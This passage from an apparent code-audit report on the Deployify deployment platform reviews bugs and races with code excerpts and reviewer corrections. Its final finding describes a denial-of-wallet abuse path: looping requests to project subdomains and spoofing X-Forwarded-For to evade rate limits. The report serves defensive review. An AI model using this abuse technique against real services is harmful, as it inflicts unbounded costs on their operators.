4. The server-side auth guards do not cover this path. `src/proxy.ts` gates only `/dashboard` and `/new` on cookie *presence*, and `src/app/dashboard/layout.tsx` renders "Redirecting to login..." when `getSession()` is null — both fire on a page load/navigation, neither fires on an in-tab `fetch('/api/projects')`.

5. The data layer does not swallow the error. `listPersonalProjects` (db.ts:1096-1115) has no try/catch, so a Firestore fault propagates to the route's catch and returns a 500 JSON body.

6. No test pins the behaviour. There is no test file for `src/app/dashboard/page.tsx` anywhere in the repo.

So the mechanism is real: every non-2xx from `/api/projects` is a JSON body without a `projects` key, `data.projects || []` yields `[]`, `loading` flips false in `finally`, and page.tsx:274-276 renders `<OnboardingGuide/>` — whose h1 is literally "Welcome to Deployify" (OnboardingGuide.tsx:53).

Where the claim overstates, and why I corrected severity rather than confirming "high":

(a) "On focus … the effect refires" is factually wrong. There is no `focus` or `visibilitychange` listener in page.tsx, Header.tsx or GlobalShortcuts.tsx — the only `window.addEventListener` in page.tsx is a `keydown` handler for the `/` shortcut (lines 51-68). The effect deps are `[activeTeam, isTeamLoading]`, so it refires only on a team switch or a component remount.

(b) The JWT-expiry route is largely mitigated and narrow. `auth.ts` sets both the JWT `setExpirationTime('7d')` (line 34) and the cookie `maxAge: 7 * 24 * 60 * 60` (line 122), so the cookie disappears with the token — meaning any page load or hard navigation is caught by proxy.ts's `/d

</details>

### 🟡 MEDIUM — currentProject is never cleared, so a failed project fetch renders the previous project's settings under the new project's URL and wires Save/Delete to the wrong project id
`product-ux-3` · `src/store/project-slice.ts:159`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** A user is on /dashboard/A/settings, then navigates to /dashboard/B/settings. `/api/projects/B` returns 500 (or 403 after a role change, or times out). `projectResponse.ok` is false, so `currentProject` stays as project A; `isLoadingProject` flips false; the `!project` "Project Not Found" branch at line 105 is skipped because `project` is truthy. The page renders A's framework, build command, install command, root/output directory, webhook URL and toggles under B's URL. The user edits the build command believing they are editing B and clicks Save — `saveProjectSettings(project.id)` PATCHes /api/projects/A, silently overwriting project A's real build configuration, and toasts "Settings saved".

**Impact.** Silent cross-project configuration overwrite with a success toast. The user has no signal that the page is showing a different project than the URL, and the damage lands on a project they were not even looking at — the hardest kind of corruption to diagnose after the fact.

**Reviewer correction.** Accurate restatement: `fetchProjectDetails` writes `currentProject` only on success and never clears it on failure, so after a client-side navigation from /dashboard/A/* to /dashboard/B/*, a non-ok or out-of-order `/api/projects/B` response leaves the store holding project A. `isLoadingProject` still flips false in the `finally`, and the `if (!project)` "Project Not Found" guard is skipped, so every project page renders A's name, framework, build commands, region, resources, branches, crons, env vars, domains and storage under B's URL.

Two corrections to the finder's framing:

1. "Wires Save/Delete to the wrong project id" is wrong. Every mutation on those pages is passed `project.id` — i.e. the *stale* project's id, the same project whose data is on screen — not `params.id`. src/app/dashboard/[id]/settings/page.tsx:288 `onClick={() => saveProjectSettings(project.id)}`, :391 `saveNotificationSettings(project.id)`, :63 `deleteProject(project.id)`; the overview/deployments/storage pages do the same. So the form values and the write target are internally consistent: B's settings are never overwritten with A's, and A's settings are never written to B. The hazard is purely the operator's mental model (URL says B, page says A), and it is partially self-announcing: the settings page renders "Back to {project.name}" (line 136) and the delete modal renders "Are you sure you want to delete <strong>{project.name}</strong>?" (settings/page.tsx:441) — both naming A. Header.tsx:24-25 only substitutes the name when `segment === currentProject.id`, so the breadcrumb falls back to the raw id "B" — mismatched, but a signal rather than a silent lie.

2. Severity is not high, and this is not a security finding at all. `currentProject` can only ever hold a project this same user already fetched successfully, i.e. one `checkProjectAccess` already authorized for them (src/middleware/rbac.ts:8-31). There is no cross-tenant read, no authz bypass, and no privilege gain for an anonymous user, a foreign tenant, or a 'viewer' member — the server re-authorizes every PATCH/DELETE against the id sent. The worst realistic outcome is a signed-in user destroying or reconfiguring their *own* project A while believing they are on B, past a confirmation dialog that names A.

Reachability is real and slightly broader than claimed, which is what keeps this at medium rather than low: it does not require a 5xx. `fetchProjectDetails` has no AbortController and no request-generation guard, so two overlapping calls resolving out of order (navigate to B while A's request is still in flight — plausible because GET /api/projects/[id] does synchronous GCP `syncDeploymentStatus` work per active deployment, src/app/api/projects/[id]/route.ts:50-84) leave currentProject = A with URL = B in a fully healthy deployment. A 403 (role revoked mid-session), 404 (deleted project), 500 or timeout produces the same state. All of this is normal signed-in tenant behaviour under NODE_ENV=production with MOCK_DB unset; no dev flag, no admin, no dead code.

One genuine mixed-identity render worth noting alongside it: src/app/dashboard/[id]/analytics/page.tsx:36-37 calls `fetchProjectDetails(projectId)` and `fetchProjectAnalytics(projectId, period)` with `params.id` (= B), while the page body reads `project = currentProject` (= A). On that page a failed project fetch paints B's traffic numbers under A's name.

Fix is one line in the failure path — `set({ currentProject: null, currentDeployments: [], userRole: null, ... })` when `!projectResponse.ok`, plus a stale-response guard comparing the resolved projectId against the latest requested one. | Accurate restatement: `fetchProjectDetails` (src/store/project-slice.ts:159) silently swallows a non-ok `/api/projects/[id]` response — it writes state only inside `if (projectResponse.ok)` while the `finally` still clears `isLoadingProject`. Because nothing ever calls `setCurrentProject` (declared :43, defined :147, zero callers) and the zustand store is module-level with no persist/reset, a failed fetch for project B leaves the previous project A in `currentProject`. The settings page's only fallback is `if (!project)` (page.tsx:105), which a truthy stale A passes, so /dashboard/B/settings renders A's framework/build/webhook/Cloud-Armor values with no error indication whatsoever. Save (`saveProjectSettings(project.id)`, line 290) and Delete (`deleteProject(project.id)`, line 63) bind to A's id, so the destructive action targets a different project than the URL. This is NOT an authorization or tenancy issue — `checkProjectAccess` guards GET/PATCH/DELETE server-side, so only projects the user already controls are affected — and the delete confirmation at line 441 does render A's real name ("Are you sure you want to delete <strong>{project.name}</strong>?"), which is the one thing standing between the user and deleting the wrong project. Downgrade to medium: a silent-failure UX/data-integrity defect with a real but confirmation-gated wrong-target delete, reachable only when the project GET fails during a project-to-project navigation. Minimal fix: on `!projectResponse.ok`, `set({ currentProject: null, userRole: null })` (and surface an error); or bind the page's mutations to `params.id` and render the not-found branch when `project.id !== params.id`.

**Verified code:**

```ts
src/store/project-slice.ts:159-206 (fetchProjectDetails — no else, no reset, unconditional finally):
159	    fetchProjectDetails: async (projectId) => {
160	        const { currentProject } = get();
161	        // Only show global loading if we don't have this project's data yet
162	        if (!currentProject || currentProject.id !== projectId) {
163	            set({ isLoadingProject: true });
164	        }
165	        try {
166	            const [projectResponse, deploymentsResponse, statsResponse] = await Promise.all([
167	                fetch(`/api/projects/${projectId}`),
...
172	            if (projectResponse.ok) {
173	                const projectData = await projectResponse.json();
174	                const project = projectData.project;
175	                set({
176	                    currentProject: project,
...
200	            }
201	        } catch (error) {
202	            console.error('Failed to fetch project details:', error);
203	        } finally {
204	            set({ isLoadingProject: false });
205	        }
206	    },

src/store/project-slice.ts:110-114 (init
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read src/store/project-slice.ts in full (1115 lines), all six pages that consume `currentProject`, ConfirmationModal, ProjectNav, the dashboard/[id] layout, GET /api/projects/[id], and checkProjectAccess.

The core mechanism is verified verbatim: `fetchProjectDetails` sets `currentProject` only inside `if (projectResponse.ok)` (line 172-187), has no `else`, no `catch`-side reset (the catch only console.errors, 201-203), and unconditionally clears the loading flag in `finally` (204). `setCurrentProject` (declared 43, defined 147) and `setActiveProjectId` (42, 146) have zero callers anywhere in src — I grepped the whole tree; the only other `currentProject` writes are the four `updateProject*` success paths (697, 716, 735, 754). So there is genuinely no reset path, and `isLoadingProject: true` initial (114) plus the `currentProject.id !== projectId` check (162) mean a fresh load is safe but a client-side project-to-project navigation is not. The store is a module-level zustand `create` (src/store/index.ts:11) with no persist and no per-route reset, so state survives every client-side navigation in the tab.

Where the claim overreaches: it says Save/Delete get wired to the wrong project id. They do not. I checked every mutation call site and they all take `project.id` from the stale object, so the write target always matches the data on screen. The settings page's breadcrumb and the delete confirmation both print `project.name`, so the wrong project is named to the user before the destructive click. And the reachability lens finds no adversary: `currentProject` can only hold a project the same user already passed checkProjectAccess for, so no anonymous user, foreign tenant, or viewer-role member gains any read or write they did not already have. Calling this high implies a security or cross-project-write impact that the code does not support.

It also under-reaches in one place: the finder framed it as requiring a 500/403. Because there is no AbortController or request-generation guard, an out-of-order resolution of two overlapping fetches reproduces the exact same stale state with a perfectly healthy backend, and GET /api/projects/[id] is slow enough (per-deployment GCP sync) for that window to be real.

Net: real, reachable, worth fixing, but a client-state correctness/UX defect rather than the described wrong-target-mutation bug — medium.

**[upholds]** I read src/store/project-slice.ts in full, the settings page, the two dashboard layouts, ProjectNav, Header, PageTransition, the ConfirmationModal, the GET/PATCH/DELETE handlers for /api/p

</details>

### 🟡 MEDIUM — The Enterprise plan's "Contact Sales" button opens a live ₹15,000 Razorpay charge, and paying customers have no way to downgrade or cancel
`product-ux-4` · `src/components/billing/PricingCard.tsx:79`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** (a) A prospect on the Team plan clicks the Enterprise card's "Contact Sales" button expecting a lead form. `onUpgrade('enterprise')` fires, /api/billing/checkout mints a real Razorpay order for 1,500,000 paise, and a ₹15,000 payment sheet opens over the page. (b) A Team-plan customer who wants to downgrade to Pro sees a button labelled "Upgrade to Pro" — clicking it charges ₹1,500 for a lower tier with no proration notice and no confirmation. (c) A Pro customer who wants to cancel finds the Free card's button permanently `disabled` (`plan.id === 'free' && !isCurrent`), no "Cancel subscription" control anywhere on the page, and no API route that would serve one.

**Impact.** An unintended ₹15,000 charge from a button whose label promises a conversation, and a recurring paid subscription with no self-serve exit. Beyond the immediate chargebacks and support load, a paid subscription with no in-product cancellation is a consumer-protection exposure in most of the markets this INR-priced product targets.

**Reviewer correction.** Directionally correct and genuinely reachable by any signed-in tenant in production, but the mechanism is milder than stated on both halves. Accurate restatement: (a) The Enterprise card's CTA reads "Contact Sales" while wired to the identical purchase handler as the paid tiers — PricingCard.tsx:80 calls `onUpgrade(plan.id)` unconditionally and `isEnterprise` only changes the label and button variant. Clicking it POSTs tierId 'enterprise' to /api/billing/checkout, which creates a real Razorpay *order* for 1,500,000 paise and opens the Razorpay payment sheet. No money is taken by the click itself — the user must still enter payment details and confirm in Razorpay's own modal, and `ondismiss` cancels cleanly — and the card visibly displays "₹15,000 / month" above the button. So this is a mislabelled-CTA defect that can lure a prospect into a checkout they did not intend, not an unauthorized charge. (b) There is no downgrade path at all: from Team, the Pro card is labelled "Upgrade to Pro" (the label ternary never compares tier ranks) and completing it charges a full ₹1,500 and overwrites the subscription with a fresh 30-day period, forfeiting the remaining Team time with no proration or credit; the Free card's button is hard-disabled, handleUpgrade early-returns on 'free', and checkout rejects 'free', so there is no self-serve route back to Free. The page's own copy at page.tsx:307 ("Upgrade or downgrade at any time") is false. However, "no way to cancel" overstates it: every purchase is a one-off `orders.create` with no Razorpay Subscription or mandate, so nothing auto-rebills — there is no recurring charge to escape, only no way to change or exit a plan you already paid for. | The defect is real but is a mislabelled-CTA and missing-downgrade-path product bug, not an unauthorized charge. Accurate restatement: (a) The Enterprise card's "Contact Sales" button is wired to the same `onUpgrade(plan.id)` handler as every paid tier (PricingCard.tsx:79-80; `isEnterprise` only changes the label and variant, never the behaviour), so clicking it POSTs tierId 'enterprise' to /api/billing/checkout — whose only tier rejection is `if (tier.id === 'free')` — and opens a Razorpay checkout sheet for ₹15,000 (TIERS.enterprise.price 15000 × 100 = 1,500,000 paise) instead of a lead form. No money moves on the click: the customer must still enter card details and confirm, and `modal.ondismiss` cleanly resets state. (b) Because neither the button label, the page handler, nor the checkout route compares the requested tier to the user's current tier, a Team (₹5,000) customer wanting Pro sees "Upgrade to Pro"; completing that sheet charges ₹1,500 with no proration or credit and verify/route.ts unconditionally writes `tier: 'pro'`, leaving them on strictly lower limits than the plan they had. (c) There is genuinely no downgrade or return-to-free path anywhere in src/ (no route, no UI; the webhook handles only `payment.captured`), but the "no way to cancel" framing overstates it: billing uses one-time `razorpay.orders.create` Orders, never the Subscriptions API, so nothing auto-renews and there is no recurring charge to cancel. Conversely, since verify/webhook write `currentPeriodEnd` while the only expiry check (tiers.ts:115) reads the never-written `subscription.expiresAt`, a paid tier never lapses on its own. Fixes: give the enterprise plan `price: 'Custom'` (PricingCard already has the branch at line 56) and route its button to a sales/mailto flow rather than `onUpgrade`; label cheaper-than-current tiers "Downgrade" and route them through a non-charging tier-change endpoint; add a self-serve return-to-free action; and reconcile the `expiresAt` / `currentPeriodEnd` field mismatch.

**Verified code:**

```ts
src/components/billing/PricingCard.tsx:24
    const isEnterprise = plan.id === 'enterprise';

src/components/billing/PricingCard.tsx:79-92
                    <Button
                        onClick={() => onUpgrade(plan.id)}
                        disabled={isCurrent || (plan.id === 'free' && !isCurrent) || loading}
                        className="w-full h-12 font-bold uppercase tracking-wider text-[8px]"
                        variant={isCurrent ? 'outline' : isEnterprise ? 'secondary' : 'primary'}
                        size="lg"
                        loading={loading}
                    >
                        {isCurrent
                            ? 'Current Plan'
                            : isEnterprise
                                ? 'Contact Sales'
                                : `Upgrade to ${plan.name}`}
                    </Button>

src/app/billing/page.tsx:75-82
    {
        id: 'enterprise',
        name: 'Enterprise',
        price: '₹15,000',
        description: 'For large scale applications with high volume.',
        features: ['Unlimited Projects
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: fully confirmed for an ordinary, unprivileged, signed-up tenant with NODE_ENV=production and MOCK_DB unset.

Call graph, end to end:
1. src/components/DashboardSidebar.tsx:95 puts `{ name: 'Billing', href: '/billing' }` in the sidebar with no role gate and no project-RBAC involvement — every signed-in user sees it.
2. src/app/billing/page.tsx:311-321 renders one PricingCard per entry of the hardcoded PLANS array, passing `onUpgrade={handleUpgrade}` uniformly to all four, enterprise included. Enterprise is NOT `price: 'Custom'` — it is `price: '₹15,000'` (page.tsx:78).
3. src/components/billing/PricingCard.tsx:80 `onClick={() => onUpgrade(plan.id)}` is unconditional. The only guard is line 81 `disabled={isCurrent || (plan.id === 'free' && !isCurrent) || loading}` — `isEnterprise` (line 24) is used purely for the label (line 89-90 'Contact Sales') and the button variant (line 83). Nothing routes enterprise anywhere else. I grepped the whole src tree for `contact.*sales|sales@|mailto` — the only hit is that one label string. There is no lead form anywhere in the repo.
4. handleUpgrade (page.tsx:100-182) early-returns only for `tierId === 'free'` (line 101), then POSTs `{tierId:'enterprise'}` to /api/billing/checkout.
5. src/app/api/billing/checkout/route.ts: auth is `getSession()` only (line 10) — no tier/role check beyond being logged in. The MOCK_DB branch (line 45) is skipped when unset; `if (tier.id === 'free')` (line 57) is the sole tier rejection; line 66 `const amount = tier.price * 100` with TIERS.enterprise.price = 15000 (src/lib/billing/tiers.ts:69) gives 1,500,000 paise; line 77 `createOrder(...)` calls the real `razorpay.orders.create` (src/lib/billing/payments.ts:38). The only thing that can stop this in production is missing Razorpay keys, which returns 503 (checkout route line 19-25) — i.e. it only fails on an unconfigured deployment.
6. Back in page.tsx:170-175 the response drives `new window.Razorpay(options); rzp1.open()` — a real payment sheet for ₹15,000.

So the finder's claim (a) is mechanically correct and reachable by any tenant. No admin, no dev env var, no dead code.

Claim (b) is also correct and I verified the money consequence: a Team-plan user sees the Pro card labelled `Upgrade to ${plan.name}` (PricingCard.tsx:91) because the label ternary only distinguishes isCurrent / isEnterprise — it never compares tier ranks. Clicking it mints a ₹1,500 order, and on success src/app/api/billing/verify/route.ts:39-49 overwrites the subscription with `tier: tierId` and a brand-new 30-day `currentPeriodEnd`, with 

</details>

### 🟡 MEDIUM — syncDeploymentStatus has no idempotency guard, and three independent pollers race it — duplicate usage-quota increments, duplicate emails, duplicate PR comments
`reliability-races-2` · `src/lib/deployment.ts:40`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** The check at line 40 is a check-then-act on a value read from Firestore with no lock, lease, or transaction, and the terminal write happens ~1-3 s later (after getBuildStatus, getCloudRunServiceUrl, getGcpProjectNumber, getService). Three callers hit the same deployment concurrently while it is building: (a) src/app/dashboard/[id]/deployments/page.tsx:50 polls GET /api/projects/[id]/deployments every 5 s, which calls syncDeploymentStatus for every active deployment (deployments/route.ts:48-70); (b) src/components/DeploymentLogsModal.tsx:54 polls GET .../deployments/[deployId]/logs every 3 s, which calls syncDeploymentStatus for the same deployment (logs/route.ts:37-56); (c) the in-process `s

**Impact.** Usage counters that gate paid tiers are inflated (a user is charged for 2 deployments and 2x build minutes for one build), and customers receive duplicate notification emails, duplicate PR comments, and duplicate chat webhooks on every raced build completion.

**Reviewer correction.** syncDeploymentStatus (src/lib/deployment.ts:36-40) is a check-then-act with no transaction, lease, or idempotency flag, and the terminal write at line 111 lands four sequential GCP round trips later. Three concurrent pollers reach it on the normal happy path — the build-logs modal every 3s (DeploymentLogsModal.tsx:54 → logs/route.ts:42), the deployments dashboard every 5s (deployments/page.tsx:50 → deployments/route.ts:55), and the in-process pollBuildStatus loop every 30s — all through GET routes that require only `checkProjectAccess` with no role check, so a 'viewer' team member reaches it too. When two land inside the completion window, both execute the SUCCESS branch: duplicate success emails (deployment.ts:158; src/lib/email/client.ts has no dedup), duplicate PR comments (deployment.ts:209; src/lib/github.ts:444 is a bare issues.createComment append), plus duplicate createDeploymentStatus, webhook notifications, Lighthouse audits, and ensureEphemeralDatabase calls. The finder's usage-quota claim does NOT hold: trackDeployment's FieldValue.increment writes to Collections.USAGE, which no code path ever reads — quota enforcement (caps.ts:44 → getUsage → getMonthlyUsage, tracker.ts:95) recounts from the DEPLOYMENTS collection via snap.size and is idempotent under repeated sync. The impact is therefore duplicate user-facing notifications and a drifting write-only stats counter, not billing or quota corruption, and the spam is self-directed (userEmail is session.user.email, accessToken is the caller's own token), so there is no security amplification. | The race is real and unguarded, but the impact is notification noise, not quota corruption. `syncDeploymentStatus` (src/lib/deployment.ts:36-42) reads the deployment, checks for a terminal status, then performs several GCP round trips before writing the terminal state at line 111 — with no lock, lease, Firestore transaction, or update precondition (`updateDeployment` at src/lib/db.ts:1266 is a bare `.update()`). Four callers can be in that window at once on the same deployment: the 3 s logs-modal poll (DeploymentLogsModal.tsx:54 → logs/route.ts:42), the 5 s deployments-list poll (dashboard/[id]/deployments/page.tsx:50 → deployments/route.ts:55), the project-overview GET (projects/[id]/route.ts:59), and the 30 s server-side `pollBuildStatus` loop (deployment.ts:342). Two winners of the check therefore each run the full success block, producing duplicate success/failure emails (deployment.ts:158, :269), duplicate PR comments (deployment.ts:209, :264 — `createPRComment` at src/lib/github.ts:434 always calls `issues.createComment`, never upserts), and duplicate webhook posts (deployment.ts:245). The claimed duplicate usage-quota increment does NOT occur in any meaningful sense: `trackDeployment` (src/lib/billing/tracker.ts:29) increments `usage/{projectId}`, but that document is never read — quota enforcement (`deploy/route.ts:53` → `caps.ts:43` → `tracker.ts:63 getMonthlyUsage`) recomputes from the DEPLOYMENTS collection, so the double-increment hits dead data with no billing or quota effect. The other duplicated writes (status, url, buildDurationMs) are idempotent. Fix is a compare-and-set on the status transition (Firestore transaction or an `update` with a `lastUpdateTime` precondition) gating only the notification block.

**Verified code:**

```ts
src/lib/deployment.ts:36-42 (the check-then-act, no lock):
  36  const deployment = await getDeploymentById(deploymentId);
  37  if (!deployment) return null;
  38
  39  // If already in a terminal state, return immediately
  40  if (deployment.status === 'ready' || deployment.status === 'error' || deployment.status === 'cancelled') {
  41      return deployment;
  42  }

src/lib/deployment.ts:77-92 (the ~1-3s window of sequential GCP calls before the terminal write):
  77  const { status, startTime, finishTime } = await getBuildStatus(buildId, projectRegion);
  83  const serviceUrl = await getCloudRunServiceUrl(serviceName, projectRegion);
  86  const projectNumber = config.gcp.projectNumber || (await getGcpProjectNumber(config.gcp.projectId)) || 'unknown';
  91  const gcpAccessToken = await getGcpAccessToken();
  92  const service = await getService(serviceName, gcpAccessToken, projectRegion);

src/lib/deployment.ts:111-117 (terminal write, plain update, no precondition):
 111  await updateDeployment(deploymentId, {
 112      status: 'ready',
 113      url: effectiveUrl,
 114      
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: fully confirmed, and it is not even adversarial — it is the default happy path. syncDeploymentStatus has four live callers, three of which are plain authenticated GET routes gated only by `checkProjectAccess(session.user.id, id)` with NO role requirement (src/middleware/rbac.ts:8-34 returns `{allowed:true, project, role}` for any team member, including role 'viewer'). Each is driven by a real client-side poller:

1. src/app/api/projects/[id]/deployments/[deployId]/logs/route.ts:42 — driven by src/components/DeploymentLogsModal.tsx:54 `interval = setInterval(() => fetchLogs(true), 3000)` hitting `/api/projects/${deployment.projectId}/deployments/${deployment.id}/logs`. Every 3s.
2. src/app/api/projects/[id]/deployments/route.ts:55 — driven by src/app/dashboard/[id]/deployments/page.tsx:50 `interval = setInterval(() => { fetchDeployments(project.id); }, 5000)`. Every 5s.
3. src/app/api/projects/[id]/route.ts:59 — project-overview GET, same sync block.
4. src/lib/deployment.ts:342 `setTimeout(poll, 30000)` — the in-process pollBuildStatus loop started by the deploy route (src/app/api/projects/[id]/deploy/route.ts:212) and the GitHub webhook (src/app/api/webhooks/github/route.ts:204, :600).

A user who clicks "deploy" and then opens the build-logs modal — the ordinary flow — has pollers #1, #2 and #4 all calling syncDeploymentStatus on the same deployment id simultaneously. No dev-only env var, no admin, no implausible precondition. Runs on real Firestore with MOCK_DB unset (src/lib/firebase.ts:17,54 are the only MOCK_DB gates; src/lib/db.ts:1165-1172 and :1266-1272 are unconditional Firestore get/update).

RACE IS REAL: line 40 reads a value fetched at line 36 and the terminal write is at line 111, separated by four sequential GCP network round trips (getBuildStatus:77, getCloudRunServiceUrl:83, getGcpProjectNumber:86, getGcpAccessToken:91 + getService:92). No transaction (only hit for `runTransaction` in src/ is the mock shim at src/lib/firebase.ts:245), no lease, no precondition on the update, and no idempotency flag on the type — src/types/index.ts:212-233 has no `notified`/`processed`/`lockedAt` field. updateDeployment does a bare `.update()`. Two requests both observing 'building' both fall through to the SUCCESS branch.

DUPLICATE SIDE EFFECTS — 2 of 3 confirmed:
- Duplicate emails: CONFIRMED. src/lib/deployment.ts:158 `await sendEmail(...)` inside the SUCCESS branch; src/lib/email/client.ts has zero dedup — it calls `client.emails.send(...)` unconditionally whenever a real Resend key is set.
- Duplicate PR comments: CONFIR

</details>

### 🟡 MEDIUM — Concurrent replica creation loses one write to the storageConfigs array, leaving a paid Cloud SQL read replica running, untracked and undeletable
`reliability-races-4` · `src/app/api/projects/[id]/storage/[storageId]/replica/route.ts:103`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** `storageConfigs` comes from `checkProjectAccess` (line 33), i.e. a plain document read, and `updateProject` (src/lib/db.ts:1117-1123) is a plain `.update()` that replaces the whole array — a textbook read-modify-write with no precondition. Two admins (or one admin and the auto-align/failover writer in sync/route.ts:184) click 'Create replica' within the ~30 s window that `createReadReplica` takes: both read the array at t0, both call the Cloud SQL API and get real replicas `mydb-replica-a1b2` and `mydb-replica-c3d4` created, then A writes [.. replicas:[A]] and B writes [.. replicas:[B]]. A's entry is gone. The DELETE handler in the same file (line 168-178) can only delete replicas found in `

**Impact.** A billable Cloud SQL read replica (db-custom tiers run tens to hundreds of USD/month) runs forever, invisible in the dashboard and unreachable by the delete endpoint. More generally, any two concurrent storage operations on one project silently discard one another's state.

**Reviewer correction.** Directionally correct, but restate as follows. src/app/api/projects/[id]/storage/[storageId]/replica/route.ts POST reads the whole storageConfigs array from a plain document read (checkProjectAccess -> getProjectById, a bare .get()) and, at lines 108-109, writes the whole array back with a bare .update() and no precondition — a classic lost update, confirmed by the absence of any runTransaction or arrayUnion outside the MOCK_DB shim.

The finder's window is wrong: createReadReplica (cloudsql.ts:259-281) is one non-polling fetch that returns an operation name immediately, so the POST's own read-to-write window is well under a second or two, not ~30 s. The realistic collision is not two admins clicking at once; it is the replica POST landing inside one of the other ten-plus full-array writers on the same project document. The worst is sync/route.ts, which snapshots storageConfigs at line 39 and then unconditionally overwrites it at line 281-282 only after a Secret Manager fetch, a live connectivity probe, a security-posture audit, an auto-align check, two IAM API calls and resource labeling — a multi-second-to-tens-of-seconds window. A single owner can hit this alone (click Sync, then create a replica while it runs; the UI has no lock).

Reachability by an unprivileged actor is only partial and this is not attacker-driven. The replica POST is gated to owner/admin (line 26) — no anonymous user and no viewer can create a replica. But sync/route.ts:35 gates on membership alone with no role check, so a 'viewer' can hold the clobbering window open at will; they still need an admin to be creating a replica inside it, so a viewer can amplify the race but cannot cause the loss unaided.

Consequence, corrected: the Cloud SQL read replica really is created and billed (in the platform's own GCP project, cloudsql.ts:256), the POST still returns 200 and the client optimistically shows it (project-slice.ts:414-424), and DELETE then 404s at lines 173-175. It is untracked and silently lost, but not undeletable — GET/DELETE /api/gcp/discover lists and reclaims live GCP resources, as does the GCP console. Blast radius is also wider than replicas: the same whole-array overwrite can clobber concurrent health, status or secret-rotation updates to other connectors in either direction. Fix is the same either way: a Firestore transaction, or per-connector subdocuments instead of an array field. | Real but over-stated. Concurrent replica creations do lose one entry from `storageConfigs` (plain read at replica/route.ts:24 → plain whole-array `.update()` at line 109 via db.ts:1117-1123, with no transaction, arrayUnion, lock, or precondition anywhere in src/), leaving one billable Cloud SQL read replica running with no record in Firestore. However: (1) the leaked instance is NOT undeletable — `discoverResources` lists every Cloud SQL instance and `DELETE /api/gcp/discover?resourceId=<name>&resourceType=cloud-sql` will delete any of them for an owner/admin; only the UI trash button is hidden, because it renders solely for `isOrphaned` resources (names containing `-pr-`/`-branch-`); (2) the race window is sub-second-to-seconds, not ~30 s, because `createReadReplica` (cloudsql.ts:246-282) returns the operation name as soon as the SQL Admin API accepts the request; (3) the cited co-writer (sync/route.ts:184) is a conditionally-gated write inside a manually triggered sync — no cron or interval writes storageConfigs in the background. Impact is untracked GCP spend plus a replica that query steering, the replica UI, and connector deletion all ignore, recoverable by hand — a reliability/cost defect requiring two near-simultaneous admin writers, not a high-severity one.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/replica/route.ts
  24:        const access = await checkProjectAccess(session.user.id, id);
  26:        if (!access.allowed || (access.role !== 'owner' && access.role !== 'admin')) {
  33:        const { project } = access;
  34:        const storageConfigs = project.storageConfigs || [];
  35:        const storage = storageConfigs.find((s: StorageConfig) => s.id === storageId);
  61:            const operationName = await createReadReplica(masterInstanceName, replicaInstanceName, region, tier);
 102:        const replicas = (storage.metadata?.replicas as unknown[]) || [];
 103:        storage.metadata = {
 104:            ...storage.metadata,
 105:            replicas: [...replicas, replica]
 106:        };
 108:        const updatedConfigs = storageConfigs.map(s => s.id === storageId ? storage : s);
 109:        await updateProject(id, { storageConfigs: updatedConfigs });
 170:        const replicas = (storage.metadata?.replicas as Array<{ id: string, name: string }>) || [];
 171:        const replica = replicas.find(r => r.id === repl
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the cited file end-to-end plus checkProjectAccess, getProjectById, updateProject, createReadReplica, the sync route, the Zustand store action, and the StorageSection UI.

LIVE AND REACHABLE: the route is not dead code. src/components/StorageSection.tsx:3772 wires a real "Create replica" button to addReadReplica(), which POSTs /api/projects/{id}/storage/{storageId}/replica (src/store/project-slice.ts:401-405). With MOCK_DB unset, getDb() (src/lib/firebase.ts:53-57) returns real Firestore, getProjectById is a plain .get() (db.ts:1001-1015) and updateProject is a plain .update() (db.ts:1117-1123). grep confirms the only runTransaction in the tree is inside the MOCK_DB shim (src/lib/firebase.ts:245); no arrayUnion anywhere. So the read-modify-write with no precondition is exactly as claimed.

MECHANISM IS REAL BUT THE FINDER'S VERSION IS WRONG IN THREE WAYS:

1. The "~30 s window" attributed to createReadReplica is false. src/lib/gcp/cloudsql.ts:259-281 is a single fetch POST to the Cloud SQL instances API that returns the operation name immediately — it does not poll to completion. The POST handler's own read-to-write window (line 24 to line 109) is sub-second to a couple of seconds, not 30 s.

2. The "two admins click simultaneously" precondition is contrived and is not where the real exposure is. The much larger window belongs to the OTHER writers on the same document. sync/route.ts reads storageConfigs at line 39 and then performs eleven separate full-array updateProject(id, { storageConfigs }) writes (lines 184, 282, 403, 456, 496, 539, 551, 568, 579, 605, 653). On the ordinary "active connector" path it reaches the write at line 281-282 only after a Secret Manager fetch, a live connectivity probe, a security-posture audit, an auto-align check, two IAM API calls and resource labeling — a multi-second to tens-of-seconds window ending in an unconditional overwrite of the stale array. A single owner with one browser can trigger this alone: click Sync (no UI lock), then create a replica while it is in flight; the sync write silently drops the replica.

3. REACHABILITY BY AN UNPRIVILEGED ACTOR IS PARTIAL. The cited line itself is gated at line 26 to owner/admin, so no anonymous user and no viewer can create a replica. But the clobbering half is viewer-reachable: sync/route.ts:35 gates only on !access.allowed with no role check, so a 'viewer' team member can hold that multi-second full-array-overwrite window open at will. A viewer cannot initiate the loss on their own — they still need an admin creating a replica inside their window — so 

</details>

### 🟡 MEDIUM — Unauthenticated edge proxy traffic bypasses rate limiting entirely and drives one Firestore write plus one BigQuery insert per request
`ssrf-proxy-6` · `src/proxy.ts:101`

**Failure scenario.** This block returns before the rate-limit block at line 115, so every request to any project subdomain is completely unmetered. Each proxied HTML GET calls logEdgeEvent (route.ts:180), which does `db.collection(Collections.ANALYTICS_EVENTS).add(eventData)` (route.ts:45) plus a BigQuery streaming insert (route.ts:49). An attacker curls https://anyproject.deployify.io/?i=1..N in a loop and generates unbounded Firestore document writes and BigQuery inserts billed to Deployify. The apex path /api/v1/proxy/... is nominally rate limited, but the key is `${ip}:${pathname}` (line 124) with ip taken from the client-controlled first element of X-Forwarded-For (line 116), so simply varying the path or t

**Impact.** Direct financial denial-of-wallet (unbounded Firestore writes + BigQuery streaming inserts + Cloud Run egress) and memory exhaustion of the edge runtime from the ever-growing rate-limit Map; the same X-Forwarded-For spoof also defeats the strict 30/min limit intended for /api/auth/ and /api/webhooks/.

